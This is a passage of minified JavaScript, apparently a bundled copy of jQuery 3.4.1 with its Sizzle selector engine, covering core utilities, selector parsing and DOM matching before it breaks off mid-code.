function _classCallCheck(t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") } !function (t, e) { "use strict"; "object" == typeof module && "object" == typeof module.exports ? module.exports = t.document ? e(t, !0) : function (t) { if (!t.document) throw new Error("jQuery requires a window with a document"); return e(t) } : e(t) }("undefined" != typeof window ? window : this, function (v, t) { "use strict"; function C(t) { return null != t && t === t.window } var e = [], x = v.document, i = Object.getPrototypeOf, r = e.slice, A = e.concat, g = e.push, o = e.indexOf, n = {}, a = n.toString, p = n.hasOwnProperty, s = p.toString, l = s.call(Object), m = {}, f = function (t) { return "function" == typeof t && "number" != typeof t.nodeType }, c = { type: !0, src: !0, nonce: !0, noModule: !0 }; function b(t, e, n) { var i, o, a = (n = n || x).createElement("script"); if (a.text = t, e) for (i in c) (o = e[i] || e.getAttribute && e.getAttribute(i)) && a.setAttribute(i, o); n.head.appendChild(a).parentNode.removeChild(a) } function B(t) { return null == t ? t + "" : "object" == typeof t || "function" == typeof t ? n[a.call(t)] || "object" : typeof t } var I = "3.4.1", F = function (t, e) { return new F.fn.init(t, e) }, u = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g; function h(t) { var e = !!t && "length" in t && t.length, n = B(t); return !f(t) && !C(t) && ("array" === n || 0 === e || "number" == typeof e && 0 < e && e - 1 in t) } F.fn = F.prototype = { jquery: I, constructor: F, length: 0, toArray: function () { return r.call(this) }, get: function (t) { return null == t ? r.call(this) : t < 0 ? this[t + this.length] : this[t] }, pushStack: function (t) { var e = F.merge(this.constructor(), t); return e.prevObject = this, e }, each: function (t) { return F.each(this, t) }, map: function (n) { return this.pushStack(F.map(this, function (t, e) { return n.call(t, e, t) })) }, slice: function () { return this.pushStack(r.apply(this, arguments)) }, first: function () { return this.eq(0) }, last: function () { return this.eq(-1) }, eq: function (t) { var e = this.length, n = +t + (t < 0 ? e : 0); return this.pushStack(0 <= n && n < e ? [this[n]] : []) }, end: function () { return this.prevObject || this.constructor() }, push: g, sort: e.sort, splice: e.splice }, F.extend = F.fn.extend = function () { var t, e, n, i, o, a, s = arguments[0] || {}, r = 1, g = arguments.length, l = !1; for ("boolean" == typeof s && (l = s, s = arguments[r] || {}, r++), "object" == typeof s || f(s) || (s = {}), r === g && (s = this, r--); r < g; r++)if (null != (t = arguments[r])) for (e in t) i = t[e], "__proto__" !== e && s !== i && (l && i && (F.isPlainObject(i) || (o = Array.isArray(i))) ? (n = s[e], a = o && !Array.isArray(n) ? [] : o || F.isPlainObject(n) ? n : {}, o = !1, s[e] = F.extend(l, a, i)) : void 0 !== i && (s[e] = i)); return s }, F.extend({ expando: "jQuery" + (I + Math.random()).replace(/\D/g, ""), isReady: !0, error: function (t) { throw new Error(t) }, noop: function () { }, isPlainObject: function (t) { var e, n; return !(!t || "[object Object]" !== a.call(t)) && (!(e = i(t)) || "function" == typeof (n = p.call(e, "constructor") && e.constructor) && s.call(n) === l) }, isEmptyObject: function (t) { var e; for (e in t) return !1; return !0 }, globalEval: function (t, e) { b(t, { nonce: e && e.nonce }) }, each: function (t, e) { var n, i = 0; if (h(t)) for (n = t.length; i < n && !1 !== e.call(t[i], i, t[i]); i++); else for (i in t) if (!1 === e.call(t[i], i, t[i])) break; return t }, trim: function (t) { return null == t ? "" : (t + "").replace(u, "") }, makeArray: function (t, e) { var n = e || []; return null != t && (h(Object(t)) ? F.merge(n, "string" == typeof t ? [t] : t) : g.call(n, t)), n }, inArray: function (t, e, n) { return null == e ? -1 : o.call(e, t, n) }, merge: function (t, e) { for (var n = +e.length, i = 0, o = t.length; i < n; i++)t[o++] = e[i]; return t.length = o, t }, grep: function (t, e, n) { for (var i = [], o = 0, a = t.length, s = !n; o < a; o++)!e(t[o], o) != s && i.push(t[o]); return i }, map: function (t, e, n) { var i, o, a = 0, s = []; if (h(t)) for (i = t.length; a < i; a++)null != (o = e(t[a], a, n)) && s.push(o); else for (a in t) null != (o = e(t[a], a, n)) && s.push(o); return A.apply([], s) }, guid: 1, support: m }), "function" == typeof Symbol && (F.fn[Symbol.iterator] = e[Symbol.iterator]), F.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (t, e) { n["[object " + e + "]"] = e.toLowerCase() }); var d = function (n) { function I(t, e, n) { var i = "0x" + e - 65536; return i != i || n ? e : i < 0 ? String.fromCharCode(65536 + i) : String.fromCharCode(i >> 10 | 55296, 1023 & i | 56320) } function o() { y() } var t, h, b, a, s, d, u, C, B, g, l, y, v, r, x, A, c, p, m, F = "sizzle" + +new Date, f = n.document, Q = 0, i = 0, G = gt(), w = gt(), X = gt(), S = gt(), k = function (t, e) { return t === e && (l = !0), 0 }, D = {}.hasOwnProperty, e = [], Z = e.pop, U = e.push, W = e.push, N = e.slice, T = function (t, e) { for (var n = 0, i = t.length; n < i; n++)if (t[n] === e) return n; return -1 }, H = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped", E = "[\\x20\\t\\r\\n\\f]", R = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+", Y = "\\[" + E + "*(" + R + ")(?:" + E + "*([*^$|!~]?=)" + E + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + R + "))|)" + E + "*\\]", O = ":(" + R + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + Y + ")*)|.*)\\)|)", _ = new RegExp(E + "+", "g"), V = new RegExp("^" + E + "+|((?:^|[^\\\\])(?:\\\\.)*)" + E + "+$", "g"), L = new RegExp("^" + E + "*," + E + "*"), M = new RegExp("^" + E + "*([>+~]|" + E + ")" + E + "*"), z = new RegExp(E + "|>"), P = new RegExp(O), K = new RegExp("^" + R + "$"), J = { ID: new RegExp("^#(" + R + ")"), CLASS: new RegExp("^\\.(" + R + ")"), TAG: new RegExp("^(" + R + "|[*])"), ATTR: new RegExp("^" + Y), PSEUDO: new RegExp("^" + O), CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + E + "*(even|odd|(([+-]|)(\\d*)n|)" + E + "*(?:([+-]|)" + E + "*(\\d+)|))" + E + "*\\)|)", "i"), bool: new RegExp("^(?:" + H + ")$", "i"), needsContext: new RegExp("^" + E + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + E + "*((?:-\\d)?\\d*)" + E + "*\\)|)(?=[^-]|$)", "i") }, j = /HTML$/i, $ = /^(?:input|select|textarea|button)$/i, q = /^h\d$/i, tt = /^[^{]+\{\s*\[native \w/, et = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/, nt = /[+~]/, it = new RegExp("\\\\([\\da-f]{1,6}" + E + "?|(" + E + ")|.)", "ig"), ot = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g, at = function (t, e) { return e ? "\0" === t ? "ï¿½" : t.slice(0, -1) + "\\" + t.charCodeAt(t.length - 1).toString(16) + " " : "\\" + t }, st = mt(function (t) { return !0 === t.disabled && "fieldset" === t.nodeName.toLowerCase() }, { dir: "parentNode", next: "legend" }); try { W.apply(e = N.call(f.childNodes), f.childNodes), e[f.childNodes.length].nodeType } catch (t) { W = { apply: e.length ? function (t, e) { U.apply(t, N.call(e)) } : function (t, e) { for (var n = t.length, i = 0; t[n++] = e[i++];); t.length = n - 1 } } } function rt(e, t, n, i) { var o, a, s, r, g, l, c, I = t && t.ownerDocument, u = t ? t.nodeType : 9; if (n = n || [], "string" != typeof e || !e || 1 !== u && 9 !== u && 11 !== u) return n; if (!i && ((t ? t.ownerDocument || t : f) !== v && y(t), t = t || v, x)) { if (11 !== u && (g = et.exec(e))) if (o = g[1]) { if (9 === u) { if (!(s = t.getElementById(o))) return n; if (s.id === o) return n.push(s), n } else if (I && (s = I.getElementById(o)) && m(t, s) && s.id === o) return n.push(s), n } else { if (g[2]) return W.apply(n, t.getElementsByTagName(e)), n; if ((o = g[3]) && h.getElementsByClassName && t.getElementsByClassName) return W.apply(n, t.getElementsByClassName(o)), n } if (h.qsa && !S[e + " "] && (!A || !A.test(e)) && (1 !== u || "object" !== t.nodeName.toLowerCase())) { if (c = e, I = t, 1 === u && z.test(e)) { for ((r = t.getAttribute("id")) ? r = r.replace(ot, at) : t.setAttribute("id", r = F), a = (l = d(e)).length; a--;)l[a] = "#" + r + " " + pt(l[a]); c = l.join(","), I = nt.test(e) && Ct(t.parentNode) || t } try { return W.apply(n, I.querySelectorAll(c)), n } catch (t) { S(e, !0) } finally { r === F && t.removeAttribute("id") } } } return C(e.replace(V, "$1"), t, n, i) } function gt() { var n = []; function i(t, e) { return n.push(t + " ") > b.cacheLength && delete i[n.shift()], i[t + " "] = e } return i } function lt(t) { return t[F] = !0, t } function ct(t) { var e = v.createElement("fieldset"); try { return !!t(e) } catch (t) { return !1 } finally { e.parentNode && e.parentNode.removeChild(e), e = null } } function It(t, e) { for (var n = t.split("|"), i = n.length; i--;)b.attrHandle[n[i]] = e } function ut(t, e) { var n = e && t, i = n && 1 === t.nodeType && 1 === e.nodeType && t.sourceIndex - e.sourceIndex; if (i) return i; if (n) for (; n = n.nextSibling;)if (n === e) return -1; return t ? 1 : -1 } function ht(e) { return function (t) { return "form" in t ? t.parentNode && !1 === t.disabled ? "label" in t ? "label" in t.parentNode ? t.parentNode.disabled === e : t.disabled === e : t.isDisabled === e || t.isDisabled !== !e && st(t) === e : t.disabled === e : "label" in t && t.disabled === e } } function dt(s) { return lt(function (a) { return a = +a, lt(function (t, e) { for (var n, i = s([], t.length, a), o = i.length; o--;)t[n = i[o]] && (t[n] = !(e[n] = t[n])) }) }) } function Ct(t) { return t && void 0 !== t.getElementsByTagName && t } for (t in h = rt.support = {}, s = rt.isXML = function (t) { var e = t.namespaceURI, n = (t.ownerDocument || t).documentElement; return !j.test(e || n && n.nodeName || "HTML") }, y = rt.setDocument = function (t) { var e, n, i = t ? t.ownerDocument || t : f; return i !== v && 9 === i.nodeType && i.documentElement && (r = (v = i).documentElement, x = !s(v), f !== v && (n = v.defaultView) && n.top !== n && (n.addEventListener ? n.addEventListener("unload", o, !1) : n.attachEvent && n.attachEvent("onunload", o)), h.attributes = ct(function (t) { return t.className = "i", !t.getAttribute("className") }), h.getElementsByTagName = ct(function (t) { return t.appendChild(v.createComment("")), !t.getElementsByTagName("*").length }), h.getElementsByClassName = tt.test(v.getElementsByClassName), h.getById = ct(function (t) { return r.appendChild(t).id = F, !v.getElementsByName || !v.getElementsByName(F).length }), h.getById ? (b.filter.ID = function (t) { var e = t.replace(it, I); return function (t) { return t.getAttribute("id") === e } }, b.find.ID = function (t, e) { if (void 0 !== e.getElementById && x) { var n = e.getElementById(t); return n ? [n] : [] } }) : (b.filter.ID = function (t) { var n = t.replace(it, I); return function (t) { var e = void 0 !== t.getAttributeNode && t.getAttributeNode("id"); return e && e.value === n } }, b.find.ID = function (t, e) { if (void 0 !== e.getElementById && x) { var n, i, o, a = e.getElementById(t); if (a) { if ((n = a.getAttributeNode("id")) && n.value === t) return [a]; for (o = e.getElementsByName(t), i = 0; a = o[i++];)if ((n = a.getAttributeNode("id")) && n.value === t) return [a] } return [] } }), b.find.TAG = h.getElementsByTagName ? function (t, e) { return void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t) : h.qsa ? e.querySelectorAll(t) : void 0 } : function (t, e) { var n, i = [], o = 0, a = e.getElementsByTagName(t); if ("*" !== t) return a; for (; n = a[o++];)1 === n.nodeType && i.push(n); return i }, b.find.CLASS = h.getElementsByClassName && function (t, e) { if (void 0 !== e.getElementsByClassName && x) return e.getElementsByClassName(t) }, c = [], A = [], (h.qsa = tt.test(v.querySelectorAll)) && (ct(function (t) { r.appendChild(t).innerHTML = "<a id='" + F + "'></a><select id='" + F + "-\r\\' msallowcapture=''><option selected=''></option></select>", t.querySelectorAll("[msallowcapture^='']").length && A.push("[*^$]=" + E + "*(?:''|\"\")"), t.querySelectorAll("[selected]").length || A.push("\\[" + E + "*(?:value|" + H + ")"), t.querySelectorAll("[id~=" + F + "-]").length || A.push("~="), t.querySelectorAll(":checked").length || A.push(":checked"), t.querySelectorAll("a#" + F + "+*").length || A.push(".#.+[+~]") }), ct(function (t) { t.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>"; var e = v.createElement("input"); e.setAttribute("type", "hidden"), t.appendChild(e).setAttribute("name", "D"), t.querySelectorAll("[name=d]").length && A.push("name" + E + "*[*^$|!~]?="), 2 !== t.querySelectorAll(":enabled").length && A.push(":enabled", ":disabled"), r.appendChild(t).disabled = !0, 2 !== t.querySelectorAll(":disabled").length && A.push(":enabled", ":disabled"), t.querySelectorAll("*,:x"), A.push(",.*:") })), (h.matchesSelector = tt.test(p = r.matches || r.webkitMatchesSelector || r.mozMatchesSelector || r.oMatchesSelector || r.msMatchesSelector)) && ct(function (t) { h.disconnectedMatch = p.call(t, "*"), p.call(t, "[s!='']:x"), c.push("!=", O) }), A = A.length && new RegExp(A.join("|")), c = c.length && new RegExp(c.join("|")), e = tt.test(r.compareDocumentPosition), m = e || tt.test(r.contains) ? function (t, e) { var n = 9 === t.nodeType ? t.documentElement : t, i = e && e.parentNode; return t === i || !(!i || 1 !== i.nodeType || !(n.contains ? n.contains(i) : t.compareDocumentPosition && 16 & t.compareDocumentPosition(i))) } : function (t, e) { if (e) for (; e = e.parentNode;)if (e === t) return !0; return !1 }, k = e ? function (t, e) { if (t === e) return l = !0, 0; var n = !t.compareDocumentPosition - !e.compareDocumentPosition; return n || (1 & (n = (t.ownerDocument || t) === (e.ownerDocument || e) ? t.compareDocumentPosition(e) : 1) || !h.sortDetached && e.compareDocumentPosition(t) === n ? t === v || t.ownerDocument === f && m(f, t) ? -1 : e === v || e.ownerDocument === f && m(f, e) ? 1 : g ? T(g, t) - T(g, e) : 0 : 4 & n ? -1 : 1) } : function (t, e) { if (t === e) return l = !0, 0; var n, i = 0, o = t.parentNode, a = e.parentNode, s = [t], r = [e]; if (!o || !a) return t === v ? -1 : e === v ? 1 : o ? -1 : a ? 1 : g ? T(g, t) - T(g, e) : 0; if (o === a) return ut(t, e); for (n = t; n = n.parentNode;)s.unshift(n); for (n = e; n = n.parentNode;)r.unshift(n); for (; s[i] === r[i];)i++; return i ? ut(s[i], r[i]) : s[i] === f ? -1 : r[i] === f ? 1 : 0 }), v }, rt.matches = function (t, e) { return rt(t, null, null, e) }, rt.matchesSelector = function (t, e) { if ((t.ownerDocument || t) !== v && y(t), h.matchesSelector && x && !S[e + " "] && (!c || !c.test(e)) && (!A || !A.test(e))) try { var n = p.call(t, e); if (n || h.disconnectedMatch || t.document && 11 !== t.document.nodeType) return n } catch (t) { S(e, !0) } return 0 < rt(e, v, null, [t]).length }, rt.contains = function (t, e) { return (t.ownerDocument || t) !== v && y(t), m(t, e) }, rt.attr = function (t, e) { (t.ownerDocument || t) !== v && y(t); var n = b.attrHandle[e.toLowerCase()], i = n && D.call(b.attrHandle, e.toLowerCase()) ? n(t, e, !x) : void 0; return void 0 !== i ? i : h.attributes || !x ? t.getAttribute(e) : (i = t.getAttributeNode(e)) && i.specified ? i.value : null }, rt.escape = function (t) { return (t + "").replace(ot, at) }, rt.error = function (t) { throw new Error("Syntax error, unrecognized expression: " + t) }, rt.uniqueSort = function (t) { var e, n = [], i = 0, o = 0; if (l = !h.detectDuplicates, g = !h.sortStable && t.slice(0), t.sort(k), l) { for (; e = t[o++];)e === t[o] && (i = n.push(o)); for (; i--;)t.splice(n[i], 1) } return g = null, t }, a = rt.getText = function (t) { var e, n = "", i = 0, o = t.nodeType; if (o) { if (1 === o || 9 === o || 11 === o) { if ("string" == typeof t.textContent) return t.textContent; for (t = t.firstChild; t; t = t.nextSibling)n += a(t) } else if (3 === o || 4 === o) return t.nodeValue } else for (; e = t[i++];)n += a(e); return n }, (b = rt.selectors = { cacheLength: 50, createPseudo: lt, match: J, attrHandle: {}, find: {}, relative: { ">": { dir: "parentNode", first: !0 }, " ": { dir: "parentNode" }, "+": { dir: "previousSibling", first: !0 }, "~": { dir: "previousSibling" } }, preFilter: { ATTR: function (t) { return t[1] = t[1].replace(it, I), t[3] = (t[3] || t[4] || t[5] || "").replace(it, I), "~=" === t[2] && (t[3] = " " + t[3] + " "), t.slice(0, 4) }, CHILD: function (t) { return t[1] = t[1].toLowerCase(), "nth" === t[1].slice(0, 3) ? (t[3] || rt.error(t[0]), t[4] = +(t[4] ? t[5] + (t[6] || 1) : 2 * ("even" === t[3] || "odd" === t[3])), t[5] = +(t[7] + t[8] || "odd" === t[3])) : t[3] && rt.error(t[0]), t }, PSEUDO: function (t) { var e, n = !t[6] && t[2]; return J.CHILD.test(t[0]) ? null : (t[3] ? t[2] = t[4] || t[5] || "" : n && P.test(n) && (e = d(n, !0)) && (e = n.indexOf(")", n.length - e) - n.length) && (t[0] = t[0].slice(0, e), t[2] = n.slice(0, e)), t.slice(0, 3)) } }, filter: { TAG: function (t) { var e = t.replace(it, I).toLowerCase(); return "*" === t ? function () { return !0 } : function (t) { return t.nodeName && t.nodeName.toLowerCase() === e } }, CLASS: function (t) { var e = G[t + " "]; return e || (e = new RegExp("(^|" + E + ")" + t + "(" + E + "|$)")) && G(t, function (t) { return e.test("string" == typeof t.className && t.className || void 0 !== t.getAttribute && t.getAttribute("class") || "") }) }, ATTR: function (n, i, o) { return function (t) { var e = rt.attr(t, n); return null == e ? "!=" === i : !i || (e += "", "=" === i ? e === o : "!=" === i ? e !== o : "^=" === i ? o && 0 === e.indexOf(o) : "*=" === i ? o && -1 < e.indexOf(o) : "$=" === i ? o && e.slice(-o.length) === o : "~=" === i ? -1 < (" " + e.replace(_, " ") + " ").indexOf(o) : "|=" === i && (e === o || e.slice(0, o.length + 1) === o + "-")) } }, CHILD: function (d, t, e, C, A) { var p = "nth" !== d.slice(0, 3), m = "last" !== d.slice(-4), f = "of-type" === t; return 1 === C && 0 === A ? function (t) { return !!t.parentNode } : function (t, e, n) { var i, o, a, s, r, g, l = p != m ? "nextSibling" : "previousSibling", c = t.parentNode, I = f && t.nodeName.toLowerCase(), u = !n && !f, h = !1; if (c) { if (p) { for (; l;) { for (s = t; s = s[l];)if (f ? s.nodeName.toLowerCase() === I : 1 === s.nodeType) return !1; g = l = "only" === d && !g && "nextSibling" } return !0 } if (g = [m ? c.firstChild : c.lastChild], m && u) { for (h = (r = (i = (o = (a = (s = c)[F] || (s[F] = {}))[s.uniqueID] || (a[s.uniqueID] = {}))[d] || [])[0] === Q && i[1]) && i[2], s = r && c.childNodes[r]; s = ++r && s && s[l] || (h = r = 0) || g.pop();)if (1 === s.nodeType && ++h && s === t) { o[d] = [Q, r, h]; break } } else if (u && (h = r = (i = (o = (a = (s = t)[F] || (s[F] = {}))[s.uniqueID] || (a[s.uniqueID] = {}))[d] || [])[0] === Q && i[1]), !1 === h) for (; (s = ++r && s && s[l] || (h = r = 0) || g.pop()) && ((f ? s.nodeName.toLowerCase() !== I : 1 !== s.nodeType) || !++h || (u && ((o = (a = s[F] || (s[F] = {}))[s.uniqueID] || (a[s.uniqueID] = {}))[d] = [Q, h]), s !== t));); return (h -= A) === C || h % C == 0 && 0 <= h / C } } }, PSEUDO: function (t, a) { var e, s = b.pseudos[t] || b.setFilters[t.toLowerCase()] || rt.error("unsupported pseudo: " + t); return s[F] ? s(a) : 1 < s.length ? (e = [t, t, "", a], b.setFilters.hasOwnProperty(t.toLowerCase()) ? lt(function (t, e) { for (var n, i = s(t, a), o = i.length; o--;)t[n = T(t, i[o])] = !(e[n] = i[o]) }) : function (t) { return s(t, 0, e) }) : s } }, pseudos: { not: lt(function (t) { var i = [], o = [], r = u(t.replace(V, "$1")); return r[F] ? lt(function (t, e, n, i) { for (var o, a = r(t, null, i, []), s = t.length; s--;)(o = a[s]) && (t[s] = !(e[s] = o)) }) : function (t, e, n) { return i[0] = t, r(i, null, n, o), i[0] = null, !o.pop() } }), has: lt(function (e) { return function (t) { return 0 < rt(e, t).length } }), contains: lt(function (e) { return e = e.replace(it, I), function (t) { return -1 < (t.textContent || a(t)).indexOf(e) } }), lang: lt(function (n) { return K.test(n || "") || rt.error("unsupported lang: " + n), n = n.replace(it, I).toLowerCase(), function (t) { var e; do { if (e = x ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (e = e.toLowerCase()) === n || 0 === e.indexOf(n + "-") } while ((t = t.parentNode) && 1 === t.nodeType); return !1 } }), target: function (t) { var e = n.location && n.location.hash; return e && e.slice(1) === t.id }, root: function (t) { return t === r }, focus: function (t) { return t === v.activeElement && (!v.hasFocus || v.hasFocus()) && !!(t.type || t.href || ~t.tabIndex) }, enabled: ht(!1), disabled: ht(!0), checked: function (t) { var e = t.nodeName.toLowerCase(); return "input" === e && !!t.checked || "option" === e && !!t.selected }, selected: function (t) { return t.parentNode && t.parentNode.selectedIndex, !0 === t.selected }, empty: function (t) { for (t = t.firstChild; t; t = t.nextSibling)if (t.nodeType < 6) return !1; return !0 }, parent: function (t) { return !b.pseudos.empty(t) }, header: function (t) { return q.test(t.nodeName) }, input: function (t) { return $.test(t.nodeName) }, button: function (t) { var e = t.nodeName.toLowerCase(); return "input" === e && "button" === t.type || "button" === e }, text: function (t) { var e; return "input" === t.nodeName.toLowerCase() && "text" === t.type && (null == (e = t.getAttribute("type")) || "text" === e.toLowerCase()) }, first: dt(function () { return [0] }), last: dt(function (t, e) { return [e - 1] }), eq: dt(function (t, e, n) { return [n < 0 ? n + e : n] }), even: dt(function (t, e) { for (var n = 0; n < e; n += 2)t.push(n); return t }), odd: dt(function (t, e) { for (var n = 1; n < e; n += 2)t.push(n); return t }), lt: dt(function (t, e, n) { for (var i = n < 0 ? n + e : e < n ? e : n; 0 <= --i;)t.push(i); return t }), gt: dt(function (t, e, n) { for (var i = n < 0 ? n + e : n; ++i < e;)t.push(i); return t }) } }).pseudos.nth = b.pseudos.eq, { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }) b.pseudos[t] = function (e) { return function (t) { return "input" === t.nodeName.toLowerCase() && t.type === e } }(t); for (t in { submit: !0, reset: !0 }) b.pseudos[t] = function (n) { return function (t) { var e = t.nodeName.toLowerCase(); return ("input" === e || "button" === e) && t.type === n } }(t); function At() { } function pt(t) { for (var e = 0, n = t.length, i = ""; e < n; e++)i += t[e].value; return i } function mt(r, t, e) { var g = t.dir, l = t.next, c = l || g, I = e && "parentNode" === c, u = i++; return t.first ? function (t, e, n) { for (; t = t[g];)if (1 === t.nodeType || I) return r(t, e, n); return !1 } : function (t, e, n) { var i, o, a, s = [Q, u]; if (n) { for (; t = t[g];)if ((1 === t.nodeType || I) && r(t, e, n)) return !0 } else for (; t = t[g];)if (1 === t.nodeType || I) if (o = (a = t[F] || (t[F] = {}))[t.uniqueID] || (a[t.uniqueID] = {}), l && l === t.nodeName.toLowerCase()) t = t[g] || t; else { if ((i = o[c]) && i[0] === Q && i[1] === u) return s[2] = i[2]; if ((o[c] = s)[2] = r(t, e, n)) return !0 } return !1 } } function ft(o) { return 1 < o.length ? function (t, e, n) { for (var i = o.length; i--;)if (!o[i](t, e, n)) return !1; return !0 } : o[0] } function bt(t, e, n, i, o) { for (var a, s = [], r = 0, g = t.length, l = null != e; r < g; r++)(a = t[r]) && (n && !n(a, i, o) || (s.push(a), l && e.push(r))); return s } function Bt(h, d, C, A, p, t) { return A && !A[F] && (A = Bt(A)), p && !p[F] && (p = Bt(p, t)), lt(function (t, e, n, i) { var o, a, s, r = [], g = [], l = e.length, c = t || function (t, e, n) { for (var i = 0, o = e.length; i < o; i++)rt(t, e[i], n); return n }(d || "*", n.nodeType ? [n] : n, []), I = !h || !t && d ? c : bt(c, r, h, n, i), u = C ? p || (t ? h : l || A) ? [] : e : I; if (C && C(I, u, n, i), A) for (o = bt(u, g), A(o, [], n, i), a = o.length; a--;)(s = o[a]) && (u[g[a]] = !(I[g[a]] = s)); if (t) { if (p || h) { if (p) { for (o = [], a = u.length; a--;)(s = u[a]) && o.push(I[a] = s); p(null, u = [], o, i) } for (a = u.length; a--;)(s = u[a]) && -1 < (o = p ? T(t, s) : r[a]) && (t[o] = !(e[o] = s)) } } else u = bt(u === e ? u.splice(l, u.length) : u), p ? p(null, e, u, i) : W.apply(e, u) }) } function yt(A, p) { function t(t, e, n, i, o) { var a, s, r, g = 0, l = "0", c = t && [], I = [], u = B, h = t || f && b.find.TAG("*", o), d = Q += null == u ? 1 : Math.random() || .1, C = h.length; for (o && (B = e === v || e || o); l !== C && null != (a = h[l]); l++) { if (f && a) { for (s = 0, e || a.ownerDocument === v || (y(a), n = !x); r = A[s++];)if (r(a, e || v, n)) { i.push(a); break } o && (Q = d) } m && ((a = !r && a) && g--, t && c.push(a)) } if (g += l, m && l !== g) { for (s = 0; r = p[s++];)r(c, I, e, n); if (t) { if (0 < g) for (; l--;)c[l] || I[l] || (I[l] = Z.call(i)); I = bt(I) } W.apply(i, I), o && !t && 0 < I.length && 1 < g + p.length && rt.uniqueSort(i) } return o && (Q = d, B = u), c } var m = 0 < p.length, f = 0 < A.length; return m ? lt(t) : t } return At.prototype = b.filters = b.pseudos, b.setFilters = new At, d = rt.tokenize = function (t, e) { var n, i, o, a, s, r, g, l = w[t + " "]; if (l) return e ? 0 : l.slice(0); for (s = t, r = [], g = b.preFilter; s;) { for (a in n && !(i = L.exec(s)) || (i && (s = s.slice(i[0].length) || s), r.push(o = [])), n = !1, (i = M.exec(s)) && (n = i.shift(), o.push({ value: n, type: i[0].replace(V, " ") }), s = s.slice(n.length)), b.filter) !(i = J[a].exec(s)) || g[a] && !(i = g[a](i)) || (n = i.shift(), o.push({ value: n, type: a, matches: i }), s = s.slice(n.length)); if (!n) break } return e ? s.length : s ? rt.error(t) : w(t, r).slice(0) }, u = rt.compile = function (t, e) { var n, i = [], o = [], a = X[t + " "]; if (!a) { for (n = (e = e || d(t)).length; n--;)(a = function t(e) { for (var o, n, i, a = e.length, s = b.relative[e[0].type], r = s || b.relative[" "], g = s ? 1 : 0, l = mt(function (t) { return t === o }, r, !0), c = mt(function (t) { return -1 < T(o, t) }, r, !0), I = [function (t, e, n) { var i = !s && (n || e !== B) || ((o = e).nodeType ? l : c)(t, e, n); return o = null, i }]; g < a; g++)if (n = b.relative[e[g].type]) I = [mt(ft(I), n)]; else { if ((n = b.filter[e[g].type].apply(null, e[g].matches))[F]) { for (i = ++g; i < a && !b.relative[e[i].type]; i++); return Bt(1 < g && ft(I), 1 < g && pt(e.slice(0, g - 1).concat({ value: " " === e[g - 2].type ? "*" : "" })).replace(V, "$1"), n, g < i && t(e.slice(g, i)), i < a && t(e = e.slice(i)), i < a && pt(e)) } I.push(n) } return ft(I) }(e[n]))[F] ? i.push(a) : o.push(a); (a = X(t, yt(o, i))).selector = t } return a }, C = rt.select = function (t, e, n, i) { var o, a, s, r, g, l = "function" == typeof t && t, c = !i && d(t = l.selector || t); if (n = n || [], 1 === c.length) { if (2 < (a = c[0] = c[0].slice(0)).length && "ID" === (s = a[0]).type && 9 === e.nodeType && x && b.relative[a[1].type]) { if (!(e = (b.find.ID(s.matches[0].replace(it, I), e) || [])[0])) return n; l && (e = e.parentNode), t = t.slice(a.shift().value.length) } for (o = J.needsContext.test(t) ? 0 : a.length; o-- && (s = a[o], !b.relative[r = s.type]);)if ((g = b.find[r]) && (i = g(s.matches[0].replace(it, I), nt.test(a[0].type) && Ct(e.parentNode) || e))) { if (a.splice(o, 1), !(t = i.length && pt(a))) return W.apply(n, i), n; break } } return (l || u(t, c))(i, e, !x, n, !e || nt.test(t) && Ct(e.parentNode) || e), n }, h.sortStable = F.split("").sort(k).join("") === F, h.detectDuplicates = !!l, y(), h.sortDetached = ct(function (t) { return 1 & t.compareDocumentPosition(v.createElement("fieldset")) }), ct(function (t) { return t.innerHTML = "<a href='#'></a>", "#" === t.firstChild.getAttribute("href") }) || It("type|href|height|width", function (t, e, n) { if (!n) return t.getAttribute(e, "type" === e.toLowerCase() ? 1 : 2) }), h.attributes && ct(function (t) { return t.innerHTML = "<input/>", t.firstChild.setAttribute("value", ""), "" === t.firstChild.getAttribute("value") }) || It("value", function (t, e, n) { if (!n && "input" === t.nodeName.toLowerCase()) return t.defaultValue }), ct(function (t) { return null == t.getAttribute("disabled") }) || It(H, function (t, e, n) { var i; if (!n) return !0 === t[e] ? e.toLowerCase() : (i = t.getAttributeNode(e)) && i.specified ? i.value : null }), rt }(v); F.find = d, F.expr = d.selectors, F.expr[":"] = F.expr.pseudos, F.uniqueSort = F.unique = d.uniqueSort, F.text = d.getText, F.isXMLDoc = d.isXML, F.contains = d.contains, F.escapeSelector = d.escape; function y(t, e, n) { for (var i = [], o = void 0 !== n; (t = t[e]) && 9 !== t.nodeType;)if (1 === t.nodeType) { if (o && F(t).is(n)) break; i.push(t) } return i } function Q(t, e) { for (var n = []; t; t = t.nextSibling)1 === t.nodeType && t !== e && n.push(t); return n } var G = F.expr.match.needsContext; function w(t, e) { return t.nodeName && t.nodeName.toLowerCase() === e.toLowerCase() } var X = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i; function S(t, n, i) { return f(n) ? F.grep(t, function (t, e) { return !!n.call(t, e, t) !== i }) : n.nodeType ? F.grep(t, function (t) { return t === n !== i }) : "string" != typeof n ? F.grep(t, function (t) { return -1 < o.call(n, t) !== i }) : F.filter(n, t, i) } F.filter = function (t, e, n) { var i = e[0]; return n && (t = ":not(" + t + ")"), 1 === e.length && 1 === i.nodeType ? F.find.matchesSelector(i, t) ? [i] : [] : F.find.matches(t, F.grep(e, function (t) { return 1 === t.nodeType })) }, 